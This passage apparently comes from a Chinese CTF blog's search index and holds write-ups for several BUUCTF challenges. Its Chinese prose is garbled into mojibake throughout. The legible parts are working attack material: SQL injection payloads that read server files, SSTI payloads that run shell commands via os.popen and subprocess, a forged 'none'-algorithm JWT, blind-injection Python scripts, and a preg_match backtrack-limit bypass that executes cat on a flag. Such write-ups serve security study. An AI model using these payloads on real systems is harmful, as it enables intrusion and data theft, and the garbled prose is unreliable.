æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„æ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°flagï¼Œè¿™é‡Œæ–°å­¦äº†ä¸€ç§æ€è·¯æˆ‘ä»¬æŸ¥çœ‹user()å‘ç°æ˜¯rootæƒé™ æ—¢ç„¶æ˜¯rootæƒé™ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å…¶å®åº”è¯¥æ˜¯è¯»å–æ–‡ä»¶~æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾çš„ä¸€ä¸ªè¿‡ç¨‹äº†ï¼Œè¿™é‡Œå­¦äº†ä¸€ä¸‹å­¦é•¿çš„æ€è·¯~å¾ˆç‰›ï¼æˆ‘ä»¬æŸ¥çœ‹etc/passwd å‘ç°wwwç”¨æˆ·çš„å­˜åœ¨ï¼Œäºæ˜¯è¿™ä¸ªæ—¶å€™ æˆ‘ä»¬å¯ä»¥é€‰æ‹©ç»§ç»­æŸ¥çœ‹ æœ‰æ—¶å†å²è®°å½•å‘½ä»¤æœªå­˜å‚¨åœ¨.bash_historyä¸­ bash_historyçš„è®°å½• çœ‹çœ‹æ˜¯å¦æœ‰çº¿ç´¢ï¼šå¾—åˆ°è¾ƒå®Œæ•´è·¯å¾„ï¼Œå¹¶ä¸”çœ‹åˆ° .DS_Store çš„å­˜åœ¨ .DS_Store æ˜¯ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„ä¸€ä¸ªéšè—çš„æ–‡ä»¶ï¼Œå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹çœ‹å…¶ä¸­çš„ä¿¡æ¯ ç›®æ ‡ç¯å¢ƒæ˜¯dockerï¼Œæ‰€ä»¥ .DS_Store æ–‡ä»¶åº”è¯¥åœ¨ /tmp ä¸­ã€‚è€Œ .DS_Store æ–‡ä»¶ä¸­ï¼Œç»å¸¸ä¼šæœ‰ä¸€äº›ä¸å¯é”®å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨hexå‡½æ•°å¯¹å…¶å†…å®¹è¿›è¡Œè½¬æ¢ï¼Œpayloadä¸ºï¼š ',content=(select hex(load_file('/tmp/html/.DS_Store'))),/* æ‰¾åˆ°flagï¼Œæœ€ç»ˆpayload ',content=(select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*","link":"/2021/05/22/buuctf16/"},{"title":"buuctf17","text":"[RCTF2015]EasySQLåˆæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œæ³¨å†Œç™»å½•æ”¹å¯† &lt;?phpsession_start();header(&quot;Content-Type: text/html; charset=UTF-8&quot;);require_once 'config.php';echo '&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;p&gt;oldpass: &lt;input type=&quot;text&quot; name=&quot;oldpass&quot; /&gt;&lt;/p&gt;&lt;p&gt;newpass: &lt;input type=&quot;text&quot; name=&quot;newpass&quot; /&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;';if(isset($_POST['oldpass']) &amp;&amp; isset($_POST['newpass'])){ $oldpass = md5($_POST['oldpass']); $newpass = md5($_POST['newpass']); $username = $_SESSION['username']; $sql = &quot;update users set pwd='$newpass' where name=\\&quot;$username\\&quot; and pwd='$oldpass'&quot;; // var_dump($sql); $query = mysql_query($sql); if($query){ exit(''); }else{ die(mysql_error()); }}?&gt; ç›´æ¥çœ‹è¿™æ®µä»£ç å§ï¼Œusernameæ­¤æ—¶æ˜¯æ²¡æœ‰è¢«md5åŠ å¯†çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ function check($string){ //$string = preg_replace(&quot;#(\\s)|(/\\*.*\\*/)#i&quot;, &quot;&quot;, $string); $postfilter = &quot;#(\\s)|(/\\*.*\\*/)|file|insert|&lt;|and|floor|ord|char|ascii|mid|left|right|hex|sleep|benchmark|substr|@|`|delete|like#i&quot;; if(preg_match($postfilter, $string,$matches)) { echo &quot;&lt;script&gt;alert('invalid string!')&lt;/script&gt;&quot;; die(); } else return $string;} è¿™æ˜¯è¿‡æ»¤å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é—­åˆusername adm&quot;extractvalue(1,concat(database()))# zè¿™è¾¹çœ‹åˆ°ä¸€ä¸ªå¸ˆå‚…çš„payload test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&amp;&amp;(column_name)regexp('^r'))),1)# æœ‰æ„æ€çš„æ˜¯ flagæ‰€åœ¨çš„åˆ—åæ²¡æœ‰å®Œå…¨å‡ºæ¥ï¼Œäºæ˜¯å°±ä½¿ç”¨äº†æ­£åˆ™åŒ¹é…åŒ¹é…å­—ç¬¦rå¾—åˆ°flag æœ€åè¦è®°å¾—ç¿»è½¬å“ˆï¼Œä¸ç„¶é•¿åº¦é™åˆ¶äº† [CSCCTF 2019 Qual]FlaskLightæŸ¥çœ‹æºç æœ‰æç¤ºï¼ŒSSTIæ³¨å…¥ç›´æ¥ä¸Špayload æ€ä¹ˆè¯´ æˆ‘å¿˜è®°ä¿å­˜äº†â€“ ä¸€å¼€å§‹æ²¡å‘ç°è¿‡æ»¤ä¸œè¥¿ï¼Œæ‰¾åˆ°äº†è¯»æ–‡ä»¶çš„fileæ–¹æ³•ï¼Œä½†æ˜¯ä¸çŸ¥é“flagä½ç½®äºæ˜¯å°è¯•å…¶ä»–æ–¹æ³•ï¼Œå‘ç°ä¼šè·³è½¬500ï¼Œæ„Ÿè§‰æ˜¯ä»€ä¹ˆè¢«è¿‡æ»¤äº†ï¼Œå‘ç°æ˜¯globals å°è¯•ä¸€ä¸‹ç»•è¿‡ï¼šå‘ç°æ‹¼æ¥æ³•å¯ä»¥ç»•è¿‡: {{&quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen(&quot;ls&quot;).read()}} æ¥ä¸‹æ¥å°±å¯ä»¥éšä¾¿ä½¿ç”¨å‘½ä»¤è¿™é‡Œæ²¡ç”¨builitinså½“è·³æ¿ï¼Œå› ä¸ºevalè¢«ç¦ç”¨äº†ï¼Œç›´æ¥ç”¨ä¸Šé¢è¿™ä¸ªæ›´ç®€æ´ ç„¶åè¿™é‡Œè¯´ä¸€ä¸‹wpçš„æ–¹æ³•ï¼Œæ„Ÿè§‰æŒºæ–°å¥‡çš„: inuxä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶/proc/self/environï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œä¿å­˜äº†ç³»ç»Ÿçš„ä¸€äº›å˜é‡ã€‚ {{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40]('/flasklight/app.py').read()}} è¯»å–æºç å‘ç°æç¤º: CCC{the_flag_is_this_dir} ä½†æ˜¯ä¸çŸ¥é“flagçš„æ–‡ä»¶åWPè¯´å¯ä»¥åˆ©ç”¨subprocess.Popenè¿™ä¸ªç±»ï¼Œæ— éœ€globalsä¹Ÿå¯ä»¥è¿›è¡Œè¯»å– import requestsurl=&quot;http://202f932e-6c5b-47c0-9de9-0a1627399bb6.node3.buuoj.cn/?search=&quot;s=requests.session()for i in range(1,1000): payload = &quot;{{''.__class__.__mro__[-1].__subclasses__()[%s]}}&quot;%i print(payload) if 'subprocess.Popen' in s.get(url+payload).text: print(i) break ç»“æœæ˜¯258payload: {{[].__class__.__bases__[0].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}} ä¸è¿‡ä¹ŸæŒºéº»çƒ¦çš„== [HITCON 2017]SSRFme&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; } echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); ä¹‹å‰åšè¿‡äº† åœ¨iæ˜¥ç§‹10 å°±æ˜¯åˆ©ç”¨geté‡Œé¢çš„perlå‘½ä»¤æ‰§è¡Œï¼Œç„¶åè¿™é¢˜å¥½åƒæ²¡æœ‰flagâ€“ [HFCTF2020]EasyLoginæ³¨å†Œâ€”â€”ç™»å½• F12æŸ¥çœ‹æºç : /** * æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ * è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD */ çŸ¥é“æ˜¯koa-static ä¸çŸ¥é“æ˜¯ä¸ªå•¥ æ˜¯node.jså§ï¼Ÿäºæ˜¯ä¹å»å­¦ä¹ ä¸€ä¸‹çœ‹äº†ä¸€ä¸‹wpè¯´æ˜¯è¦åœ¨controllersä¸‹çš„api.jsæ‰æ˜¯çœŸæ­£çš„æºç  node.jsç”±äºæœ¬é¢˜æ˜¯åŸºäºkoaæ¡†æ¶çš„ï¼Œæ‰€ä»¥éœ€è¦äº†è§£ä»–çš„ä¸€äº›åŸºç¡€ä¿¡æ¯ koaæ¡†æ¶å¸¸ç”¨ç›®å½•ã€æ–‡ä»¶ çœ‹äº†è¿™ä¸ªæ¡†æ¶åå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾çš„æ˜¯å¤„ç†é€»è¾‘ï¼Œä½†æ˜¯æœ¬é¢˜ä¸­ï¼Œå¤„ç†é€»è¾‘æ”¾åœ¨controllers/api.jsæ–‡ä»¶ä¸‹ï¼ˆç»éªŒï¼‰ï¼Œæœ‰çš„controllersé»˜è®¤ç›®å½•ä¸‹çš„æ–‡ä»¶å°±æ˜¯api.js const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = { 'POST /api/register': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length &gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});//jwtéªŒè¯ ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username &amp;&amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) =&gt; { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) =&gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); }}; çœ‹äº†ä¸€ä¸‹ä»£ç ï¼Œä¸»è¦æ˜¯æ˜¯è¦ä¼ªé€ jwtä¸ºadminç„¶åå°±å¯ä»¥è¯»å–flagæƒ¹=-=å°è±¡ä¸­ä¹‹å‰ä¹Ÿåšè¿‡ä¸€é¢˜ä¼ªé€ jwtäº† å§è¿™ä¸ªauthoå•¥çš„æ‹¿å»https://jwt.io/è¿™ä¸ªç½‘ç«™è§£ç ç„¶åjwtä¼šé˜²ç¯¡æ”¹ï¼Œè¿™é‡Œç»•è¿‡çš„å§¿åŠ¿å°±æ˜¯å°†HS256æ”¹ä¸ºnoneï¼Œç„¶åæ„é€ : {&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}.{&quot;secretid&quot;: [],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1623114083}.ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTYyMzEzMzA0NX0.Qjxs0QkJ0e_Sjrn8WbCPKaE5kFouERQY8RZ6nGctW6Q è®°å¾—å°†usernameæ¢æˆadminï¼Œç„¶åç™»é™†è¿›å»ä»¥åæŠ“åŒ…æŒ‰getflagå°±è¡Œ jwtæ”»å‡»å°ç»“jwtå°±æ˜¯ä¸€ç§éªŒè¯æ–¹å¼ï¼Œæ€è·¯å°±æ˜¯æ‹¿åˆ°å¯†æ–‡ï¼Œç„¶åå»ç½‘ç«™è§£å¯†https://jwt.io/ï¼Œä¿®æ”¹å…¶ä¸­çš„å€¼ï¼Œå†åŠ å¯†å›å»ï¼Œæœ¬åœ°èƒ½ç»•è¿‡æ˜¯å› ä¸ºéªŒè¯æ–¹å¼æ¯”è¾ƒç®€å•ï¼šé¦–å…ˆç­¾åç®—æ³•ç¡®ä¿æ¶æ„ç”¨æˆ·åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šä¿®æ”¹JWTï¼Œä½†æ˜¯jwtæ”¯æŒæ— ç­¾åç®—æ³•ï¼Œ**æ‰€ä»¥å¦‚æœå°†algçš„åŠ å¯†æ–¹å¼æ”¹ä¸ºnone**ï¼Œå°±ä¸ç”¨å¯¹jwtè¿›è¡Œç­¾åï¼Œè¿™æ ·jwtçš„å­˜åœ¨å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚ secretæ›´æ”¹ä¸ºæ•°ç»„çš„åŸå› æ˜¯ä¹Ÿæ˜¯å’Œä¸Šé¢çš„æ›´æ”¹noneæ–¹æ³•ç›¸å‘¼åº”ï¼Œå› ä¸ºåªæœ‰secretæ›´æ”¹ä¸ºç©ºè¿™ä¸ªæ–¹æ³•æ‰æœ‰æ•ˆä½†æ˜¯æœ¬é¢˜ä¸ºä»€ä¹ˆæ›´æ”¹ä¸ºæ•°ç»„ï¼Ÿä¸ºä»€ä¹ˆä¸ç›´æ¥æ”¾ç©ºç™½ï¼Œè¿™ç‚¹åœ¨ä»–çš„æºç æœ‰å†™ï¼Œsecretä¸èƒ½ä¸ºç©ºjsæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œsecretè®¾ä¸ºä¸€ä¸ªæ•°ç»„æˆ–å°æ•°ï¼Œæ¯”è¾ƒæ°¸è¿œä¸ºçœŸï¼Œä½†æ˜¯å¹¶ä¸”ä¸ä¸ºç©ºã€‚ æ”»å‡»æ€è·¯:æ³¨å†Œè·å¾—jwtâ€”â€”æ›´æ”¹jwtâ€”â€”é‡æ–°è¿›å…¥ [GYCTF2020]EzsqliSQLæ³¨å…¥ï¼Œæ•°å­—å‹æ³¨å…¥ï¼Œè¿‡æ»¤infomationï¼Œæ¨æµ‹è¦æ— åˆ—åæ³¨å…¥äº†æ¥ä¸‹æ¥æµ‹è¯•ä¸€ä¸‹æ³¨å…¥ç‚¹å‘ç° id=1å’Œid=2å›æ˜¾ä¸ä¸€æ · è¿™é‡Œæœ‰ä¸ªç»†èŠ‚éœ€è¦è¯´ä¸€ä¸‹ï¼Œç”±äºandè¢«è¿‡æ»¤äº†ï¼Œ&amp;&amp;åœ¨urlä¼ è¾“è¿‡ç¨‹ä¸­æœ‰å…¶ä»–å«ä¹‰ï¼Œä¸å¥½ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œç”¨çš„|ï¼Œä½†æ˜¯ç”¨|çš„è¯å°±éœ€è¦æˆ‘ä»¬è®©id=2ï¼Œè¿™æ · ä¸¤ä¸ªéƒ½é”™æ‰æ˜¯v&amp;nï¼Œä¸€ä¸ªå¯¹ä¸€ä¸ªé”™å°±æ˜¯nu1lï¼Œå¦‚æœæ˜¯id=1ï¼Œå°±ä¼šä¸€ç›´æ˜¯nu1l æ¥ä¸‹æ¥å°±è´´è„šæœ¬æƒ¹: import requestsurl=&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;s=requests.session()database=&quot;&quot;for i in range(1,100000000): low=0 high=264 mid = (low + high) // 2 while(low&lt;high): #payload_1=f&quot;2||ascii(substr(database(),{i},1))&gt;{mid}&quot;#çˆ†åº“give_grandpa_pa_pa_pa #payload_2=f&quot;2||ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),{i},1))&gt;{mid}&quot;#f1ag_1s_h3r3_hhhhh payload_2 = f&quot;2||ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),{i},1))&gt;{mid}&quot;#åƒæ— åˆ—åæ³¨å…¥å¾ˆç»å¸¸åˆ—åéƒ½æ˜¯flagï¼Œå¥½å‡ æ¬¡äº†ï¼Œ #print(payload_2) #payload_2= data={ &quot;id&quot;:payload_2 } print(s.post(url,data=data).text) if &quot;Nu1L&quot; in s.post(url,data=data).text: low=mid+1 else: high=mid mid = (low + high) // 2 if (mid == 0 or mid == 264): break database += chr(mid) print(database)print(database) æœ‰ä¸ªå¾ˆæ— è¯­çš„äº‹ï¼Œå°±æ˜¯ä¸€æ—¦è¯·æ±‚å¤šäº†ï¼Œç½‘é¡µå°±ä¼šå´©æºƒâ€“ï¼Œæ‰€ä»¥å¾ˆç—›è‹¦ æˆ‘è¿˜ä¸€ç›´åœ¨æƒ³æ˜¯å‡ºäº†ä»€ä¹ˆé—®é¢˜äº†ï¼Œå°±ç®—æŠŠçº¿ç¨‹æ”¹ä¸º1ä¹Ÿä¸è¡Œâ€“ ç”±äºæœ¬é¢˜è¿‡æ»¤äº†union æ‰€ä»¥å¸¸è§„çš„æ— åˆ—åæ³¨å…¥åœ¨è¿™é‡Œå°±è¡Œä¸é€šäº†è¿™é‡Œå­¦ä¹ ä¸€ä¸‹ æ— åˆ—åæŒ‰ä½æ¯”è¾ƒæ³¨å…¥import requestss=requests.session()url=&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;payload=&quot;&quot;def trans(flag): res='' for i in flag: res+=hex(ord(i)) res='0x'+res.replace('0x','') return resflag=''for i in range(1,500): hexchar='' for char in range(32,126): hexchar = trans(flag+chr(char)) payload = '2||((select 1,{})&gt;(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar) data = { 'id': payload } r = requests.post(url=url, data=data) text = r.text if 'Nu1L' in r.text: flag += chr(char - 1) print(flag) break 1.è¯´ä¸€ä¸‹åŸç†ï¼Œè¿™é‡Œæ˜¯ä½¿ç”¨äº†ä¸€ä¸ªæ¯”è¾ƒçš„æ€æƒ³ï¼Œå…ˆæ¯”ç¬¬ä¸€ä½ï¼Œå¦‚æœç¬¬ä¸€ä½ç›¸ç­‰åˆ™æ¯”è¾ƒç¬¬äºŒä½ï¼Œåœ¨æŸä¸€ä½ä¸Šï¼Œå¦‚æœå‰è€…çš„ ASCII å¤§ï¼Œä¸ç®¡æ€»é•¿åº¦å¦‚ä½•ï¼ŒASCII å¤§çš„åˆ™å¤§ 2.æ‰€ä»¥è¿™é‡Œéœ€è¦ä¸¤ä¸ªå¾ªç¯ï¼Œä¸€ä¸ªå¾ªç¯è®°å½•æ¬¡æ•°ï¼Œä¸€ä¸ªå¾ªç¯æ”¾å­—ç¬¦ æ— åˆ—åæ³¨å…¥å°ç»“:æ— åˆ—åæ³¨å…¥å¯èƒ½æ˜¯ä¹‹å‰éƒ½æ²¡å°ç»“è¿‡ï¼Œæ¯æ¬¡éƒ½è¦ç¿»ä¸€ä¸‹è®°å½•:è¿™é‡Œæ€»ç»“ä¸€ä¸‹æ–¹ä¾¿è®°å¿†çš„å…¬å¼å§ select b from (select 1,2 as b,3 union select * from users)a; è™šæ‹Ÿåˆ—å å­—æ®µæ•° å¹¶ä¸”å°†è¦æ˜¾ç¤ºçš„ as b è¡¨å ä»»æ„å­—æ¯(select 1,çˆ†ç ´å†…å®¹)&gt;(select * from è¡¨å)","link":"/2021/06/05/buuctf17/"},{"title":"preg_replaceå‡½æ•°ç»•è¿‡","text":"&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; ä»Šå¤©åˆ©ç”¨è¿™é“é¢˜æ¥æ•´ç†ä¸€ä¸‹preg_matchçš„ç»•è¿‡å§¿åŠ¿é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹preg_matchçš„è¿”å›å€¼æœ‰ä»€ä¹ˆ:1.è¿”å›12.è¿”å›03.è¿”å›false è®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æœpreg_matchä½œä¸ºåˆ¤æ–­æ¡ä»¶ï¼Œç”¨æ¥åŒ¹é…å±é™©å­—ç¬¦ï¼Œå¦‚æœåŒ¹é…åˆ°åˆ™ä¸º1æ­¤æ—¶æˆ‘ä»¬å°±è¢«wafæ‰äº†ï¼Œå¦‚æœæ˜¯è¿”å›é”™è¯¯ä»¥åŠ0ï¼Œè¿™å°±æ„å‘³ç€ç€æˆ‘ä»¬ç»•è¿‡äº†ï¼ 0ç¯‡æ¥ç€ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æœ‰ä»€ä¹ˆæ¡ä»¶å¯ä»¥ä½¿æˆ‘ä»¬åŒ¹é…åˆ°0ï¼š æ ¹æ®æ–‡æ¡£æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå¦‚æœæ²¡æœ‰sçš„è¯ï¼ŒåŒ¹é…åˆ°æ¢è¡Œç¬¦ï¼Œpreg_matchå°±ä¼šåœæ­¢åŒ¹é…ï¼ˆpreg_matchå°½åŠ›åŒ¹é…ç¬¬ä¸€è¡Œï¼‰åˆ©ç”¨ç‚¹:å¦‚æœæ­¤æ—¶åœ¨æˆ‘ä»¬çš„è¯­å¥å‰åŠ å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„æˆ‘ä»¬è¯­å¥å°†ä¸ä¼šè¢«åŒ¹é…åˆ°ï¼Œå‰æpreg_matchæ¨¡å¼ç¬¦ä¸­æ²¡æœ‰æ·»åŠ sã€‚ payload: {&quot;cmd&quot;:&quot;%0A&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0A&quot;} falseç¯‡è´ªå©ªä¸éè´ªå©ªæ¨¡å¼è´ªå©ªæ¨¡å¼ï¼šå¯ä»¥è¿™æ ·è®¤ä¸ºï¼Œå°±æ˜¯åœ¨æ•´ä¸ªè¡¨è¾¾å¼åŒ¹é…æˆåŠŸçš„å‰æä¸‹ï¼Œå°½å¯èƒ½å¤šçš„åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œè´ªå©ªâ€ï¼Œé€šä¿—ç‚¹è®²ï¼Œå°±æ˜¯çœ‹åˆ°æƒ³è¦çš„ï¼Œæœ‰å¤šå°‘å°±æ¡å¤šå°‘ï¼Œé™¤éå†ä¹Ÿæ²¡æœ‰æƒ³è¦çš„äº†ã€‚éè´ªå©ªæ¨¡å¼ï¼šå¯ä»¥è¿™æ ·è®¤ä¸ºï¼Œå°±æ˜¯åœ¨æ•´ä¸ªè¡¨è¾¾å¼åŒ¹é…æˆåŠŸçš„å‰æä¸‹ï¼Œå°½å¯èƒ½å°‘çš„åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œéè´ªå©ªâ€ï¼Œé€šä¿—ç‚¹è®²ï¼Œå°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæƒ³è¦çš„æ¡èµ·æ¥å°±è¡Œäº†ï¼Œè‡³äºè¿˜æœ‰æ²¡æœ‰æ²¡æ¡çš„å°±ä¸ç®¡äº†ã€‚ è´ªå©ªæ¨¡å¼ï¼š$str = 'this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha';preg_match('/src.*jpg/', $str, $match);var_dump($match); è¾“å‡ºç»“æœ: array(1) { [0]=&gt; string(28) &quot;src=&quot;mypic.jpg&quot;/&gt; , goog jpg&quot;} å› ä¸ºæ˜¯è´ªå©ªæ¨¡å¼ï¼Œæ‰€ä»¥è¿™é‡Œå¤šæ•°é™¤äº†ä¸€ä¸ªjpg éè´ªå©ªæ¨¡å¼ï¼š$str = 'this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha';preg_match('/src=&quot;.*?\\.jpg&quot;/', $str, $match);var_dump($match); array(1) { [0] =&gt; string(15) &quot;src=&quot;mypic.jpg&quot;&quot;} æˆ‘ä»¬å¯ä»¥é€šè¿‡æ·»åŠ æƒ°æ€§é™å®šç¬¦æˆ–ä¿®é¥°ç¬¦è¿›è¡Œå¤„ç† å›æº¯ç”±äºæ˜¯éè´ªå©ªæ¨¡å¼ï¼Œæ‰€ä»¥æœ‰å›æº¯çš„æ¦‚å¿µçš„å­˜åœ¨ï¼šä¸¾ä¸ªä¾‹å­ $str = 'this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha';preg_match('/src=&quot;.*?\\.jpg&quot;/', $str, $match);var_dump($match); ç†è§£ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€é¦–å…ˆ.ï¼Ÿåœ¨è¿™é‡ŒåŒ¹é…çš„æ˜¯srcå’Œ.jpgä¹‹é—´çš„å†…å®¹ï¼Œé‚£ä¹ˆåŒ¹é…çš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼šé¦–å…ˆ.\\ï¼ŸåŒ¹é…åˆ°â€œ=â€å·ï¼Œæ­¤æ—¶=å·æ»¡è¶³ï¼Œæ”¾å…¥å¤‡é€‰å½•å½“ä¸­ï¼Œæ¥ä¸‹æ¥å°†åŒ¹é…æ§åˆ¶æƒäº¤ç»™jpgï¼Œå‘ç°è¿™ä¸ª=å·ä¸æ»¡è¶³ï¼Œäºæ˜¯å›æº¯ç»™.*ï¼Ÿè®©å®ƒåŒ¹é…äº†ï¼Œæ‰€ä»¥æœ€ç»ˆç»“æœå°±æ˜¯src=â€mypic.jpgâ€ æ¬¡æ•°é™åˆ¶å›æº¯ä¹Ÿä¸æ˜¯æƒ³å›å¤šå°‘æ¬¡å°±å›å¤šå°‘æ¬¡ï¼Œ åœ¨PHPä¸­ï¼Œæ­£åˆ™åŒ¹é…çš„é€’å½’æ¬¡æ•°ç”± pcre.backtrack_limit æ§åˆ¶ PHP5.3.7 ç‰ˆæœ¬ä¹‹å‰é»˜è®¤å€¼ä¸º 10ä¸‡ ï¼ŒPHP5.3.7 ç‰ˆæœ¬ä¹‹åé»˜è®¤å€¼ä¸º 100ä¸‡ ï¼Œè¯¥å€¼å¯ä»¥é€šè¿‡php.iniè®¾ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ phpinfo é¡µé¢æŸ¥çœ‹ã€‚å¦‚ä¸Šæ‰€ç¤ºï¼Œå½“æˆ‘ä»¬è¶…è¿‡å›æº¯æ¬¡æ•°ï¼Œæ­¤æ—¶è¿”å›çš„å°±æ˜¯false æ¼”ç¤ºï¼š&lt;?php$data = '&lt;?php phpinfo();aaaaa'.str_repeat(' ',1000000);$a=preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data,$data1);print_r($a);print_r($data1); Array() æ­¤æ—¶å°±åŒ¹é…ä¸åˆ°äº†è„šæœ¬ï¼š import requestspayload = '{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;a&quot;:&quot;' + &quot;a&quot;*(1000000) + '&quot;}'res = requests.post(&quot;http://c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn/&quot;, data={&quot;cmd&quot;:payload})print(res.text) 